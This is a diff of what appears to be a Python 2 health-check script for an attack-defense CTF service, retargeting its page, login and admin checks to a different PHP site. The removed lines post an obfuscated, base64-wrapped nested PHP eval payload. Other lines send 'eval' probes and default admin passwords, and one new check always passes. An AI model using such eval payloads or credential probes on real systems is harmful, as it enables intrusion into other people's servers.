@@ -79,51 +79,52 @@ class check():
 
     def index_check(self):
 	res = http('get',host,port,'/index.php?file=news&cid=1&page=1&test=eval&time=%s'%str(my_time),'',headers)
-	if 'A Travel Agency' in res:
+	if '分享你的故事' in res:
 	    return True
 	if debug:
-	    print "[fail!] index_check_fail"
+	    print "[fail!] index_fail"
 	return False
 	
 
     def test_check(self):
-	res = http('get',host,port,'/contact.php?file=flag&time=%s'%str(my_time),'',headers)
-	if 'info@example.com' in res:
+	res = http('get',host,port,'/install.php','',headers)
+	if '' in res:
 	    return True
 	if debug:
-	    print "[fail!] test_check_fail"
+	    print "[fail!] test_fail"
 	return False
 
 
-    def admin_check(self):
+    def test_check_2(self):
 	headers['Cookie'] = ''
-	data = base64.b64encode('eval($b($c($d($b($c($d($b($c($d($b($c($d("BcHJglAwAADQD2Uo0UsOPUtNR8UYVqkb1RhYcKT2r+975tP9ze/G4hhpcgKyhlHNeFY+VLqnCNUBq55lTggTDCQuMEAPeGsrZK35BnUpXBriUPk9VDxp4pL3x7iYj3YH5nIa0/qxXMRMsvmVjX7vkjjs0YYadh5onm96ALwKbaxC1cZgZt5MxBQAi7XfekgpnF0oRBHRVIaznEZaDjbMBJxLXlnLHEIqhMhPofY0PhV3WPsfvYhn7Prhxzc7tw1NLDh7XuS7O3ODKMbAvU1/vAx1kJDp9n59kK7eA84Sw1WUeZfpZTp9AQ==")))))))))))));');
-	res = http('post',host,port,'/admin.php?time=%s'%str(my_time),data,headers)
-	if 'theme_advanced_buttons1' in res:
+	data = 'key=1'
+	res = http('post',host,port,'/admin/login.php',data,headers)
+	if '登录到故事会' in res:
 	    return True
 	if debug:
-	    print "[fail!] admin_check_fail"
+	    print "[fail!] flag_fail"
 	return False
 	
 
     def login_check(self):
 	headers['Cookie'] = 'PHPSESSID=ujg0tpds1u9d23b969f2duj5c7;'
-	res = http('get',host,port,'/login.php','username=admin&password=admin123&captcha=a',headers)
-	if 'Forgot password' in res:
+	headers['X-Requested-With'] = 'XMLHttpRequest'
+	res = http('post',host,port,'/admin/login/index.html','username=admin&password=admin&verify=7480',headers)
+	if '"status":1' in res:
 	    return True
 	if debug:
 	    print "[fail!] login_fail"
 	return False
 
-    def admin_index_check(self):
+    def admin_check(self):
 	data = 'eval(666)'
 	headers['Cookie'] = 'PHPSESSID=ujg0tpds1u9d23b969f2duj5c7;'
-    	res = http('get',host,port,'/index.php/admin/Index/main.html',data,headers)
-	tmp = http('get',host,port,'/index.php/admin/index/logout.html','',headers)
-	if '/var/www/html' in res:
+    	res = http('get',host,port,'/admin/tools/database?type=export',data,headers)
+	tmp = http('get',host,port,'/admin/login/loginout.html','',headers)
+	if 'qq3479015851_article_type' in res:
 	    return True
 	if debug:
-	    print "[fail!] admin_index fail"
+	    print "[fail!] admin_fail"
 	return False
     
 
@@ -134,7 +135,7 @@ def server_check():
 	    return False
 	if not a.test_check():
 	    return False
-	if not a.login_check():
+	if not a.test_check_2():
 	    return False	
 	return True
     except Exception,e:
